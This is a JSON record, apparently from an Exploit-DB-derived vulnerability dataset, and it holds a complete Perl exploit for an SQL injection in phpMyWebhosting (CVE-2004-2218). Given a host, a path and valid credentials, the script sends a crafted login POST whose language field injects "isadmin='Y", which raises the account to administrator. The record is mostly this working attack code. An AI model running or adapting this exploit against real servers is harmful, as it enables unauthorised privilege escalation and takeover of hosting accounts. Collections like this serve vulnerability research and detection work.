{
  "id": "406",
  "title": "phpMyWebhosting - SQL Injection",
  "cve": "CVE-2004-2218",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n# Exploit code by Noam Rathaus of Beyond Security Ltd.\r\n# The following exploit code will use a valid username and password \r\ncombination, to cause an SQL injection.\r\n# Using the SQL injection, the Perl script elevates the privileges of the \r\nuser provided to administrative.\r\n\r\nuse IO::Socket;\r\nuse strict;\r\n\r\nmy $Host = shift;\r\nmy $Path = shift;\r\nmy $Username = shift;\r\nmy $Password = shift;\r\n\r\nif ($Host eq \"\" || $Path eq \"\" || $Username eq \"\" || $Password eq \"\")\r\n{\r\nprint \"You must run the script with the following syntax:\\n\";\r\nprint $0.\" hostname path username password\\n\";\r\nexit(0);\r\n}\r\n\r\nmy $remote = IO::Socket::INET->new (  Proto => \"tcp\", PeerAddr => $Host, \r\nPeerPort => \"80\" );\r\n\r\nunless ($remote) { die \"cannot connect to http daemon on $Host\" }\r\n\r\nprint \"connected\\n\";\r\n\r\n$remote->autoflush(1);\r\n\r\nmy $http = \"POST /$Path/index.php HTTP/1.1\r\nHost: $Host\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040506 \r\nFirefox/0.8\r\nConnection: close\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: \";\r\n\r\nmy $content = \r\n\"PHP_AUTH_USER=$Username&password=$Password&language=english',isadmin='Y&login=Login\";\r\n\r\n$http .= length($content).\"\r\n\r\n$content\";\r\n\r\nprint \"HTTP: [$http]\\n\";\r\nprint $remote $http;\r\nsleep(1);\r\nprint \"Sent\\n\";\r\n\r\nwhile ()\r\n{\r\nprint $_;\r\n}\r\nprint \"\\n\";\r\n\r\nclose $remote;\r\n\r\n\r\n# milw0rm.com [2004-08-20]",
  "url": "https://www.exploit-db.com/exploits/406"
}